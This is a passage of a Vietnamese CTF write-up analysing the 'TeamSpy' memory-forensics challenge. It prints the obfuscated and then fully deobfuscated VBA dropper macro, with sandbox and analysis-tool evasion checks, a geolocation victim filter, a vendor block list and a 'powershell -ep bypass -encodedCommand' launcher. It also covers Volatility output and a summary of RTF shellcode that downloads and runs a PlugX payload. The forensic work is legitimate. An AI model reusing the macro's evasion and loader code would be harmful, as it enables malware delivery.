        DecodeData("sHHDEnzsejWRDNsT", 87, 17), _
        DecodeData("dDRvsSjNbaTUAOHiKlegPearW", 114, 95), _
        DecodeData("IomZPScdmCxLoSaaE", 26, 31), _
        DecodeData("JEGpiWssHMTnqTZO", 55, 24), _
        DecodeData("xjdETaCIdEDpgMaZvU", 179, 28), _
        DecodeData("tZACXbnUjTFosorcim", 179, 89), _
        DecodeData("cNRxJtrcSdFYpyiUe", 25, 42), _
        DecodeData("CjCiCMDzEeenmdIWb", 99, 97), _
        DecodeData("tdcnMrVgVaHoTeneOfx", 199, 45), _
        DecodeData("ldRuEwtjnqeKCRastcA", 169, 20), _
        DecodeData("CDRgcNcMaSeEOQPI", 107, 153), _
        DecodeData("tRYSvkIEkntFeEXr", 43, 59), _
        DecodeData("tScebwiEpBgtLaEhA", 53, 165), _
        DecodeData("ZmUnSKYeaUXnydOGon", 139, 80), _
        DecodeData("ioVbPDLzkoucBj", 65, 67), _
        DecodeData("APkEBTvzPHjotlA oL", 35, 109), _
        DecodeData("BtEFenCKPIRgiOonjpf", 34, 189), _
        DecodeData("YEREezcLrpOjFLn", 28, 119), _
        DecodeData("EREtnec atAduYFcZCIk", 179, 31), _
        DecodeData("EMFCNEvBXsaTEBrSR", 181, 23), _
        DecodeData("mWWirEKtItVJsRKAHU", 31, 189), _
        DecodeData("onyVbEaXfUlCtOCFu", 23, 174), _
        DecodeData("Pm.PPLpdSehHEILecEh", 128, 37), _
        DecodeData("dOQtMrerIVeeCPSNrGf", 61, 41), _
        DecodeData("nzTaxlGZBBAOIZm", 139, 160), _
        DecodeData("FaKeLYtLrKspOa$|", 563, 673), _
        DecodeData("ToQoaGNPrIY UTrlPK", 41, 117), _
        DecodeData("ncODiT nieYoElSISgHgjyRtoEyp", 241, 44), _
        DecodeData("wJBDEeKLUienRkAHtFdr", 67, 182), _
        DecodeData("StobccxZjiOzwF", 75, 102), _
        DecodeData("UTrOiE sNMrOdCoMOdfE", 49, 161), _
        DecodeData("eoabt RTLmcgEuwoFA", 23, 129), _
        DecodeData("sAPHVUgtsElSLIoVQ", 45, 54), _
        DecodeData("EKEESMovkIlrxIr", 56, 154), _
        DecodeData("XBTOLZOrofHDCcS", 73, 134), _
        DecodeData("tzsgSshDOVyAH AV", 103, 152), _
        DecodeData("wAJhVemMTOVltGUD", 109, 42), _
        DecodeData("ACEmImwHPPdOzxYts", 186, 39), _
        DecodeData("eDltWp,Ns IsSEppSbo", 117, 51), _
        DecodeData("NIItOPdRtLoRoTDRG", 39, 19), _
        DecodeData("XlCbMnsPAQeEakSezSLG", 51, 124), _
        DecodeData("EzGRSHtCBcaToLIB", 147, 145))
End Function

Public Function DownloadContent() As String
    Dim httpRequest As Object
    Set httpRequest = CreateObject(DecodeData("ti1pHOetvu.msib.HW.tnxRtXqpBeWJtnj5", 229, 297))
    
    HTTPRequestCall httpRequest.Open(GetRequestMethod, GetRequestURL, False)
    HTTPRequestCall httpRequest.SetRequestHeader DecodeData("wUrnneJYfAWernRe", 109, 126), _
                                               DecodeData("drmnpewomHsnarha/-mwmyc:dtetxlaow/-b/.estmodF.eik/c-spic", 181, 518)
    HTTPRequestCall httpRequest.SetRequestHeader DecodeData("-rteueUqADErGnsbgqF", 84, 196), _
                                               DecodeData(" t/at6W cznrs7i4j/.iMoici .b.x50nSmlhdN0l0R.;dIplUeT;e M0 oEaagn  ;(o)Tw", 733, 631)
    HTTPRequestCall httpRequest.Send
    If httpRequest.Status = 200 Then
        DownloadContent = httpRequest.ResponseText
    End If
End Function

Public Function GetRequestMethod() As String
    GetRequestMethod = DecodeData("TPGdZvPEneXX", 65, 50)
End Function

Public Function GetRequestURL() As String
    GetRequestURL = DecodeData("cem:yioi/Ptin/VypdwX//.wHmvcwhe2o.tk.mmtW1/apc/gxsJ", 515, 437)
End Function

Public Function ContainsBlockedKeyword(ByVal textStr As String, ByVal keywords As Variant) As Boolean
    Dim keyword As Variant
    For Each keyword In keywords
        If ContainsIgnoreCase(textStr, keyword) Then
            ContainsBlockedKeyword = True
            Exit Function
        End If
    Next
    ContainsBlockedKeyword = False
End Function

Public Sub HTTPRequestCall(ByVal dummyParam)
    ' Hàm placeholder (không thực hiện hành động)
End Sub

Public Sub CheckRecentFilesCount()
    If GetRecentFilesCount < MinimumRecentFilesCount Then Err.Raise 101
End Sub

Public Function GetRecentFilesCount() As Integer
    GetRecentFilesCount = RecentFiles.Count
End Function

Public Function MinimumRecentFilesCount() As Integer
    MinimumRecentFilesCount = 3
End Function

Public Sub CheckTaskNames()
    Dim task As Variant
    For Each task In GetTasks
        If ContainsBlockedKeyword(task.Name, BlockedTaskNames) Then Err.Raise 104
    Next
End Sub

Public Function GetTasks() As Object
    Set GetTasks = Tasks
End Function

Public Function BlockedTaskNames() As Variant
    BlockedTaskNames = Array( _
        DecodeData("OlNVvXriBMlNK", 96, 81), _
        DecodeData("IaNCeKfwHFJRrcUsGi", 173, 151), _
        DecodeData("nNWmtSjeaOoPinOy UsZCrRt", 179, 83), _
        DecodeData("amsaAejRJtdSHXUvt", 134, 134), _
        DecodeData("MMtmYVoKQaIqNut", 64, 144), _
        DecodeData("bDVFlCexdEIkkrLL", 55, 147), _
        DecodeData("ITuyGoIA aSVcezicSblU", 178, 137), _
        DecodeData("iF2SxlB3NCS&emaDLoaDfay ", 611, 306), _
        DecodeData("QPEOG RvSepSrTeOAClJOpaRX", 122, 151), _
        DecodeData("sA1^pBar alWn2OlTvFLqTX uIe", 541, 421), _
        DecodeData("rTEdGipwVBsPBWcw", 77, 161) _
    )
End Function

Public Sub CheckTasksCount()
    If GetTasksCount < MinimumTasksCount Then Err.Raise 103
End Sub

Public Function MinimumTasksCount() As Integer
    MinimumTasksCount = 50
End Function

Public Function GetTasksCount() As Integer
    GetTasksCount = GetCount(Tasks)
End Function

Public Function GetCount(ByVal collectionObj As Object) As Integer
    GetCount = collectionObj.Count
End Function

Public Function DecodeString(ByVal inputStr As String, ByVal stepVal As Integer, ByVal offsetVal As Integer) As String
    Dim indexPos As Integer
    indexPos = Modulo(offsetVal, Len(inputStr))
    Do While Len(DecodeString) < Len(inputStr) - GetErrorNumber
        DecodeString = DecodeString & GetNextChar(inputStr, indexPos)
        indexPos = Modulo((indexPos + stepVal), Len(inputStr))
    Loop
End Function

Public Function Modulo(ByVal dividend As Integer, ByVal divisor As Integer) As Integer
    Modulo = dividend Mod divisor
End Function

Public Function GetErrorNumber() As Integer
    GetErrorNumber = Err.Number
End Function

Public Function GetErrorSource() As String
    GetErrorSource = Err.Source
End Function

Public Sub RaiseError(ByVal errObject, ByVal errorCode As Integer, ByVal errorSource As String)
    errObject.Raise errorCode, errorSource
End Sub

Public Function GetNextChar(ByVal textStr As String, ByVal indexPos As Integer) As String
    GetNextChar = GetCharAtPosition(textStr, indexPos + 1)
End Function

Public Function DecodeData(ByVal inputStr As String, ByVal stepVal As Integer, ByVal offsetVal As Integer) As String
    On Error Resume Next
    RaiseError Err, 9, inputStr
    DecodeData = DecodeString(GetErrorSource, stepVal, offsetVal)
End Function

Public Function PrependPrefix(ByVal inputData As String) As String
    PrependPrefix = GetPrefix & inputData
End Function

Public Function GetPrefix() As String
    GetPrefix = DecodeData("1pe  eC Mr-apda#olb-noZtses enbwlyncm0]hps-ddae poom", 119, 53)
End Function

Public Function EchoValue(ByVal valueIn As Variant) As Variant
    EchoValue = valueIn
End Function

```
    
</details>

##### Tuy có thể dễ đọc hơn nhưng các payload thực thi chính đã bị encode, nhưng ta cũng có thể xem được các hàm nào được thực thi chính.
```
EchoValue comObject.Run(GetRunCommand, 0)
Public Function GetRunCommand() As String
    GetRunCommand = PrependPrefix( _
        DecodeData sang python ta sẽ được hàm sau:
```
    def decode_data(input_str, step_val, offset_val):
    length = len(input_str)
    if length == 0:
        return ""
    step = step_val % length
    index = offset_val % length
    target_length = length - 9  
    decoded = []
    for _ in range(target_length):
        decoded.append(input_str[index])
        index = (index + step) % length
    return ''.join(decoded)

```("AHABJACABZAEuBbYEoQRMA9AAwABQAQABwAHABIAG3BIECsAcMAuAbEAlwAAABAAGABdAHpAIADsBb4HuQU4ApgAsABAAGABQAHABYAHUBIUH0AJwAvg1EAyAAIABQAHABbAHvBNAG0BLwH3AZ4AvQAwAAwAEAAaAGABMAHlBcUDpgcYApgAQABwAkABAAHABZACWBZUG0QaYCvgZ4AuQAMABQACAAMAHgAbAHyBK8H0QVkAggAIABQAHAAAAGABbAHiAZkGiAb4Asw") & _
        "UAjAAUABwAHAAVADBBdgDiBd4GuQZUAFwA0ABQAHABZADABYAG1BIwG4QYwAwAAUALAAQAAAAFABLAHlBLUHfANwEwARQAhQA0ABgAGABcAChALAChBZIHTgbUAlgA8AAwAvABwACABUAGlBcEClAOgAvgToApwAQABAAGABIAFlALMDkBIAGuwbkA2gAMABAACAAZAFABYAGlBZgCuQUgA0gAYAQwAIABQA"), 353, 469)
End Function
```
##### Vì nó đã được sửa tên nên ta lấy tên cũ là UsoJar

##### Nếu chuyển hàm DecodeData sang python ta sẽ được hàm sau:
```
def decode_data(input_str, step_val, offset_val):
    length = len(input_str)
    if length == 0:
        return ""
    step = step_val % length
    index = offset_val % length
    target_length = length - 9  
    decoded = []
    for _ in range(target_length):
        decoded.append(input_str[index])
        index = (index + step) % length
    return ''.join(decoded)
```
##### Bây giờ các full script malicous sẽ là 
```
Dim isProcessed As Boolean

Public Sub OnImagePainted(ByVal unusedParam As Long, ByVal unusedRect As IInkRectangle)
    If isProcessed Then Exit Sub
    isProcessed = True
    ExecuteMainRoutine
End Sub

Public Sub ExecuteMainRoutine()
    On Error GoTo HandleError

    CheckDocumentNameValidity
    CheckRecentFilesCount
    CheckTasksCount
    CheckTaskNames
    ValidateDownloadedContent

    Dim comObject As Object
    Set comObject = CreateObject(GetCOMObjectName)
    EchoValue comObject.Run(GetRunCommand, 0)
    
    MsgBox "Invalid Macro Format"
    Exit Sub
HandleError:
    MsgBox 666
End Sub

Public Function GetCOMObjectName() As String
    GetCOMObjectName = "WScript.Shell"
End Function

Public Function GetRunCommand() As String
    GetRunCommand = PrependPrefix( _
        DecodeData("AHABJACABZAEuBbYEoQRMA9AAwABQAQABwAHABIAG3BIECsAcMAuAbEAlwAAABAAGABdAHpAIADsBb4HuQU4ApgAsABAAGABQAHABYAHUBIUH0AJwAvg1EAyAAIABQAHABbAHvBNAG0BLwH3AZ4AvQAwAAwAEAAaAGABMAHlBcUDpgcYApgAQABwAkABAAHABZACWBZUG0QaYCvgZ4AuQAMABQACAAMAHgAbAHyBK8H0QVkAggAIABQAHAAAAGABbAHiAZkGiAb4Asw") & _
        "UAjAAUABwAHAAVADBBdgDiBd4GuQZUAFwA0ABQAHABZADABYAG1BIwG4QYwAwAAUALAAQAAAAFABLAHlBLUHfANwEwARQAhQA0ABgAGABcAChALAChBZIHTgbUAlgA8AAwAvABwACABUAGlBcEClAOgAvgToApwAQABAAGABIAFlALMDkBIAGuwbkA2gAMABAACAAZAFABYAGlBZgCuQUgA0gAYAQwAIABQA"), 353, 469)
End Function

Public Sub CheckDocumentNameValidity()
    If IsNameValid(GetDocumentBaseName) Then Err.Raise 102
End Sub

Public Function GetDocumentBaseName() As String
    GetDocumentBaseName = ExtractFileNamePrefix(ActiveDocument.Name)
End Function

Public Function ExtractFileNamePrefix(ByVal fullName As String) As String
    ExtractFileNamePrefix = Left(fullName, FindSubstringPosition(fullName, ".") - 1)
End Function

Public Function FindSubstringPosition(ByVal mainStr As String, ByVal subStr As String) As Integer
    FindSubstringPosition = InStr(mainStr, subStr)
End Function

Public Function IsNameValid(ByVal nameStr As String) As Boolean
    Dim charCount As Integer
    charCount = 1
    Dim i As Integer
    For i = 1 To Len(nameStr)
        If ContainsIgnoreCase(AllowedChars, GetCharAtPosition(nameStr, i)) Then
            charCount = charCount + 1
        End If
    Next
    IsNameValid = (charCount = i)
End Function

Public Function AllowedChars() As String
    AllowedChars = "0123456789ABCDEF"
End Function

Public Function GetCharAtPosition(ByVal textStr As String, ByVal pos As Integer) As String
    GetCharAtPosition = RightSubstring(LeftSubstring(textStr, pos), 1)
End Function

Public Function RightSubstring(ByVal textStr As String, ByVal count As Integer) As String
    RightSubstring = Right(textStr, count)
End Function

Public Function LeftSubstring(ByVal textStr As String, ByVal count As Integer) As String
    LeftSubstring = Left(textStr, count)
End Function

Public Function ContainsIgnoreCase(ByVal mainStr As String, ByVal searchStr As String) As Boolean
    ContainsIgnoreCase = (InStr(LCase(mainStr), LCase(searchStr)) <> 0)
End Function

Public Sub ValidateDownloadedContent()
    Dim downloadedContent As String
    downloadedContent = DownloadContent
    If Not ContainsIgnoreCase(downloadedContent, "uNItEd sTaTes") Then Err.Raise 105
    If ContainsBlockedKeyword(downloadedContent, BlockedKeywords) Then Err.Raise 106
End Sub

Public Function BlockedKeywords() As Variant
BlockedKeywords = Array( _
    "Fortinet", _
    "DataCenter", _
    "BlackOakComputers", _
    "Nuclear", _
    "ProofPoint", _
    "Army", _
    "University", _
    "Hetzner", _
    "ParadiseNetworks", _
    "Academic", _
    "Hosting", _
    "Dedicated", _
    "Microsoft", _
    "Security", _
    "Medicine", _
    "Government", _
    "DataCenter", _
    "Science", _
    "FireEye", _
    "LeaseWeb", _
    "Anonymous", _
    "Cloud", _
    "Palo Alto", _
    "Forcepoint", _
    "NForce", _
    "Data Center", _
    "Veterans", _
    "Trustwave", _
    "BlueCoat", _
    "HiSpeed.ch", _
    "TrendMicro", _
    "Amazon", _
    "Allsafe", _
    "IronPort", _
    "Strong Technologies", _
    "BitDefender", _
    "Cisco", _
    "Trend Micro", _
    "Blue Coat", _
    "Hospital", _
    "Server", _
    "School", _
    "OVH SAS", _
    "VMVault", _
    "Mimecast", _
    "Eset, Spol", _
    "IronPort", _
    "MessageLabs", _
    "ZScaler")
End Function

Public Function DownloadContent() As String
    Dim httpRequest As Object
    Set httpRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
    
    HTTPRequestCall httpRequest.Open(GetRequestMethod, GetRequestURL, False)
    HTTPRequestCall httpRequest.SetRequestHeader "Referer", _
                                               "https://www.maxmind.com/en/locate-my-ip-address"
    HTTPRequestCall httpRequest.SetRequestHeader "User-Agent", _
                                               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)"
    HTTPRequestCall httpRequest.Send
    If httpRequest.Status = 200 Then
        DownloadContent = httpRequest.ResponseText
    End If
End Function

Public Function GetRequestMethod() As String
    GetRequestMethod = "GET"
End Function

Public Function GetRequestURL() As String
    GetRequestURL = "https://www.maxmind.com/geoip/v2.1/city/me"
End Function

Public Function ContainsBlockedKeyword(ByVal textStr As String, ByVal keywords As Variant) As Boolean
    Dim keyword As Variant
    For Each keyword In keywords
        If ContainsIgnoreCase(textStr, keyword) Then
            ContainsBlockedKeyword = True
            Exit Function
        End If
    Next
    ContainsBlockedKeyword = False
End Function

Public Sub HTTPRequestCall(ByVal dummyParam)
    ' Hàm placeholder (không thực hiện hành động)
End Sub

Public Sub CheckRecentFilesCount()
    If GetRecentFilesCount < MinimumRecentFilesCount Then Err.Raise 101
End Sub

Public Function GetRecentFilesCount() As Integer
    GetRecentFilesCount = RecentFiles.Count
End Function

Public Function MinimumRecentFilesCount() As Integer
    MinimumRecentFilesCount = 3
End Function

Public Sub CheckTaskNames()
    Dim task As Variant
    For Each task In GetTasks
        If ContainsBlockedKeyword(task.Name, BlockedTaskNames) Then Err.Raise 104
    Next
End Sub

Public Function GetTasks() As Object
    Set GetTasks = Tasks
End Function

Public Function BlockedTaskNames() As Variant
BlockedTaskNames = Array( _
    "VBOX", _
    "wIResHarK", _
    "PROCesS mONitor", _
    "vXStReam", _
    "autoIt", _
    "FIDdLer", _
    "VISUal bASIc", _
    "alLSaFe SaNDBox", _
    "PROCeSS EXplOreR", _
    "TvFLqTX uIesA1^pBa", _
    "TcPViEw" _
)
End Function

Public Sub CheckTasksCount()
    If GetTasksCount < MinimumTasksCount Then Err.Raise 103
End Sub

Public Function MinimumTasksCount() As Integer
    MinimumTasksCount = 50
End Function

Public Function GetTasksCount() As Integer
    GetTasksCount = GetCount(Tasks)
End Function

Public Function GetCount(ByVal collectionObj As Object) As Integer
    GetCount = collectionObj.Count
End Function


Public Function GetErrorNumber() As Integer
    GetErrorNumber = Err.Number
End Function

Public Function GetErrorSource() As String
    GetErrorSource = Err.Source
End Function

Public Sub RaiseError(ByVal errObject, ByVal errorCode As Integer, ByVal errorSource As String)
    errObject.Raise errorCode, errorSource
End Sub

Public Function GetNextChar(ByVal textStr As String, ByVal indexPos As Integer) As String
    GetNextChar = GetCharAtPosition(textStr, indexPos + 1)
End Function


Public Function PrependPrefix(ByVal inputData As String) As String
    PrependPrefix = GetPrefix & inputData
End Function

Public Function GetPrefix() As String
    GetPrefix = "powershell -ep bypass -nop -encodedCommand"
End Function

Public Function EchoValue(ByVal valueIn As Variant) As Variant
    EchoValue = valueIn
End Function
```
##### Vì yêu cầu challenge chỉ đến đây nên mình phân tích đến đây thôi.
    
    
    
    
### ecorpwin7
```
Volatility Foundation Volatility Framework 2.6.1
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xfffffa80018ad890 System                    4      0     84      387 ------      0 2016-10-04 14:35:02 UTC+0000                                 
0xfffffa8002019b30 smss.exe                252      4      2       29 ------      0 2016-10-04 14:35:02 UTC+0000                                 
0xfffffa8002c3e740 csrss.exe               332    316      9      509      0      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002e69910 wininit.exe             384    316      3       75      0      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002e8e950 csrss.exe               392    376     11      390      1      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002eba060 winlogon.exe            428    376      3      111      1      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002efdb30 services.exe            484    384      7      207      0      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002f05b30 lsass.exe               500    384      7      628      0      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002f11b30 lsm.exe                 508    384     10      197      0      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002f9a970 svchost.exe             624    484      9      351      0      0 2016-10-04 14:35:03 UTC+0000                                 
0xfffffa8002fcbb30 vmacthlp.exe            684    484      3       54      0      0 2016-10-04 14:35:04 UTC+0000                                 
0xfffffa8002ff54a0 svchost.exe             728    484      8      301      0      0 2016-10-04 14:35:04 UTC+0000                                 
0xfffffa80030251b0 svchost.exe             812    484     19      443      0      0 2016-10-04 14:35:04 UTC+0000                                 
0xfffffa800304fb30 svchost.exe             860    484     15      364      0      0 2016-10-04 14:35:04 UTC+0000                                 
0xfffffa8003060060 svchost.exe             904    484     43     1128      0      0 2016-10-04 14:35:04 UTC+0000                                 
0xfffffa80030ae360 svchost.exe             264    484     14      622      0      0 2016-10-04 14:35:04 UTC+0000                                 
0xfffffa80030e9550 svchost.exe             744    484     22      548      0      0 2016-10-04 14:35:05 UTC+0000                                 
0xfffffa800312d1d0 spoolsv.exe            1052    484     13      322      0      0 2016-10-04 14:35:05 UTC+0000                                 
0xfffffa8003157b30 svchost.exe            1080    484     18      306      0      0 2016-10-04 14:35:05 UTC+0000                                 
0xfffffa80031e1b30 armsvc.exe             1172    484      4       69      0      1 2016-10-04 14:35:05 UTC+0000                                 
0xfffffa8003250b30 VGAuthService.         1264    484      3       84      0      0 2016-10-04 14:35:05 UTC+0000                                 
0xfffffa80032893c0 vmtoolsd.exe           1332    484      9      298      0      0 2016-10-04 14:35:06 UTC+0000                                 
0xfffffa800335b060 WmiPrvSE.exe           1672    624     10      273      0      0 2016-10-04 14:36:08 UTC+0000                                 
0xfffffa800323b740 dllhost.exe            1764    484     13      191      0      0 2016-10-04 14:36:09 UTC+0000                                 
0xfffffa80033ddb30 msdtc.exe              1928    484     12      131      0      0 2016-10-04 14:36:11 UTC+0000                                 
0xfffffa800353cb30 taskhost.exe           2080    484     10      186      1      0 2016-10-04 14:36:24 UTC+0000                                 
0xfffffa8003556670 dwm.exe                2132    860      5      132      1      0 2016-10-04 14:36:24 UTC+0000                                 
0xfffffa8003573b30 explorer.exe           2172   2120     27      843      1      0 2016-10-04 14:36:24 UTC+0000                                 
0xfffffa80035f2060 vmtoolsd.exe           2304   2172      6      191      1      0 2016-10-04 14:36:25 UTC+0000                                 
0xfffffa8003686b30 SearchIndexer.         2608    484     15      834      0      0 2016-10-04 14:36:31 UTC+0000                                 
0xfffffa800353ab30 svchost.exe             288    484      8      169      0      1 2016-10-04 14:36:55 UTC+0000                                 
0xfffffa8003645370 rundll32.exe           2432    288      7      858      1      1 2016-10-04 14:36:57 UTC+0000                                 
0xfffffa80037e4780 rundll32.exe           2404    288      2       66      1      1 2016-10-04 14:36:57 UTC+0000                                 
0xfffffa80037a7060 OUTLOOK.EXE            2496   2172     20     2125      1      1 2016-10-04 14:37:22 UTC+0000                                 
0xfffffa80036a9b30 svchost.exe            2772    484     11      137      0      0 2016-10-04 14:37:23 UTC+0000                                 
0xfffffa8003962b30 sppsvc.exe             3656    484      4      149      0      0 2016-10-04 14:38:08 UTC+0000                                 
0xfffffa8002653630 svchost.exe            1256    484      5      102      0      0 2016-10-05 02:02:12 UTC+0000                                 
0xfffffa800264a6d0 conhost.exe            3056    332      2       33      0      0 2016-10-05 02:12:43 UTC+0000                                 
0xfffffa8003e46060 sc.exe                 3580   3112      1       25      0      1 2016-10-05 02:46:00 UTC+0000                                 
0xfffffa8003481790 chrome.exe             1896   2172     35     1070      1      0 2016-10-05 03:35:25 UTC+0000                                 
0xfffffa80037b5b30 chrome.exe             1788   1896      7       77      1      0 2016-10-05 03:35:25 UTC+0000                                 
0xfffffa80032bf930 chrome.exe             3100   1896      5      174      1      0 2016-10-05 03:35:26 UTC+0000                                 
0xfffffa800397d060 chrome.exe             3000   1896     12      190      1      0 2016-10-05 03:35:27 UTC+0000                                 
0xfffffa80036f3060 chrome.exe              316   1896     11      156      1      0 2016-10-05 03:35:27 UTC+0000                                 
0xfffffa800388b060 chrome.exe             2812   1896     12      338      1      0 2016-10-05 03:35:32 UTC+0000                                 
0xfffffa800412cb30 SearchProtocol         3244   2608      8      321      0      0 2016-10-05 03:38:00 UTC+0000                                 
0xfffffa8003782060 SearchFilterHo         2464   2608      5       93      0      0 2016-10-05 03:38:00 UTC+0000                                 
0xfffffa8004057060 cmd.exe                4084   1332      0 --------      0      0 2016-10-05 03:39:07 UTC+0000   2016-10-05 03:39:07 UTC+0000  
```
#### 10. What is the MD5 hash of the malicious document?
##### Tương tự máy trước, ta tiến hành quét folder outlook bằng filescan
![image](https://hackmd.io/_uploads/ryV2iDwtkg.png)
##### Đầu ra cho ra 1 file pst của email Outlscott.knowles@e-corp.biz-00000004, ta cũng sử dụng dumpfiles và pffexport để lấy dump file này về máy và trích xuất các thông tin trong email.
![image](https://hackmd.io/_uploads/rkBnkBdK1e.png)
![image](https://hackmd.io/_uploads/B1VT1SdKJl.png)
##### Sau khi export thành công, kiểm tra lần lượt các email
##### Trong folder message0005 có 1 email phishing được gửi từ `lloydchung@allsafecybersec.com` và 1 file đính kèm, tuy nhiên file đính kèm đã bị hỏng
![image](https://hackmd.io/_uploads/SJ8qXH_Kyl.png)
![image](https://hackmd.io/_uploads/SyJJtuuFkx.png)
![image](https://hackmd.io/_uploads/SkI67HOK1x.png)
##### Vì vậy ta chuyển hướng tìm trực tiếp file này trong bộ nhớ của victim
![image](https://hackmd.io/_uploads/B1pxEBdKJe.png)
![image](https://hackmd.io/_uploads/SyF-NS_t1l.png)
##### Ta thu được 1 file rtf, upload lên virustotal để xác nhận nó có phải file malicous không.
![image](https://hackmd.io/_uploads/SkeiVHuYJx.png)
##### Sử dụng md5sum để kiểm tra check sum của nó nhưng submit không thành công.
##### Dùng [hexed.it](hexed.it) để kiểm tra hex code của nó xem có vấn đề gì không
![image](https://hackmd.io/_uploads/SybPUBOFkx.png)
##### Có vài byte 00 dư thừa ở đây nên ta sẽ loại bỏ chúng
![image](https://hackmd.io/_uploads/r1RNDB_KJe.png)

```
┌──(kali㉿kali)-[~/Downloads/e]
└─$ md5sum fix.rtf 
00e4136876bf4c1069ab9c4fe40ed56f  fix.rtf           
```
#### 11. What is the common name of the malicious file that gets loaded?"
##### Dựa vào thông tin cảnh báo từ VirusTotal về CVE-2010-3333, nghiên cứu từ google ta có 1 vài thông tin như sau 
![image](https://hackmd.io/_uploads/rkPhsHuYJl.png)
##### Ta sẽ tiến hành debug shellcode bằng công cụ `scdbg`
![image](https://hackmd.io/_uploads/HytITBdKke.png)
```
Shellcode này thực hiện các bước:

    Tải thư viện mạng để kết nối Internet.
    Kết nối tới máy chủ từ xa files.allsafecybersec.com.
    Tải xuống file độc hại (avupdate.exe) từ server.
    Lưu tệp vào máy cục bộ với tên ecorpav.exe.
    Thực thi tệp đã tải xuống để kích hoạt mã độc.
    Thoát tiến trình để ẩn dấu vết.
```
##### Bây giờ tiến hành dump file thực thi này ra từ bộ nhớ
```
┌──(kali㉿kali)-[~/Personal/CTF/volatility]
└─$ python2 vol.py -f ~/Downloads/Cyberdefender/93-TeamSpy/ecorpwin7/ecorpwin7-e73257c4.vmem --profile=Win7SP1x64 filescan | grep -i ecorpav    
Volatility Foundation Volatility Framework 2.6.1
0x000000007d6f8070      1      0 R--r-- \Device\HarddiskVolume1\Users\scott.knowles\Documents\ecorpav.exe
┌──(kali㉿kali)-[~/Personal/CTF/volatility]
└─$ python2 vol.py -f ~/Downloads/Cyberdefender/93-TeamSpy/ecorpwin7/ecorpwin7-e73257c4.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007d6f8070 -D ~/Downloads
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x7d6f8070   None   \Device\HarddiskVolume1\Users\scott.knowles\Documents\ecorpav.exe
```
![image](https://hackmd.io/_uploads/SkO9CB_tkx.png)
##### File này được virustotal gắn tag là korplug, tìm kiếm trên internet thì korplug còn được gọi là `plugX`
![image](https://hackmd.io/_uploads/SkAgkL_FJg.png)

#### 12. What password does the attacker use to stage the compressed file for exfil?
##### Tiến hành phân tích file PE này, đầu tiên xác định thông tin file với `DetectItEasy`
![image](https://hackmd.io/_uploads/HJv7n_dF1x.png)
##### Từ output của nó ta thấy rằng đây là 1 tệp lưu trữ dưới dạng sfx 
```
sfx (Self-Extracting Archive) là một dạng đặc biệt của tệp nén, được thiết kế để tự động giải nén nội dung mà không cần phần mềm giải nén bên ngoài như WinRAR hoặc 7-Zip.
```
##### Mở tệp này với 7z ta thu được 3 file
![image](https://hackmd.io/_uploads/rJmslYOYyx.png)
```
┌──(kali㉿kali)-[~/Downloads/ecorpav]
└─$ cat a.bat 
a.exe
start Important_E-Corp_Lawsuit_hist.doc
```
##### Nội dung file a.bat cho thấy rằng chúng cố gắng thực thi tệp a.exe và mở Important_E-Corp_Lawsuit_hist.doc (đây có lẻ là tài liệu thật cho người dùng mất cảnh giác)

##### Bởi vì không tìm thấy tiến trình nào là a.exe  nên ta chuyển đối tượng qua các tiến trình như cmd.exe, nhưng khi dùng plugin consoles thì không thấy lệnh nào được chạy.
##### Ngoài cmd.exe ta còn 1 tiến trình khác là `conhost.exe` 
```
    Tiến trình conhost.exe (Console Window Host) là một tiến trình hệ thống hợp pháp của Windows, có vai trò hỗ trợ giao diện console cho các ứng dụng dòng lệnh (Command Prompt, PowerShell, hoặc các ứng dụng console khác). Làm trung gian giữa cmd.exe và csrss.exe để xử lý đầu vào/đầu ra của cửa sổ dòng lệnh.
```
![image](https://hackmd.io/_uploads/BJWBOwsFyx.png)
![image](https://hackmd.io/_uploads/HJr7oviFyl.png)
> password1234

#### 13. What is the IP address of the c2 server for the malicious file?
##### Tìm kiếm về các report có liên quan đến file thực thi này, mình tìm được trang [hybrid-analysis](https://www.hybrid-analysis.com/sample/62dd4bf3325c3d586a5374a118fa458fd9f252414f5723115639aac994d865b6?environmentId=120) và xác định được ip c2 server
![image](https://hackmd.io/_uploads/HJ2ik8ut1x.png)


#### What is the email address that sent the phishing email?
##### Đã phân tích ở trên 
> lloydchung@allsafecybersec.com
    
#### 14. What is the name of the deb package the attacker staged to infect the E Coin Servers?
##### Tương tự câu 12
![image](https://hackmd.io/_uploads/ByzwoPiYJg.png)
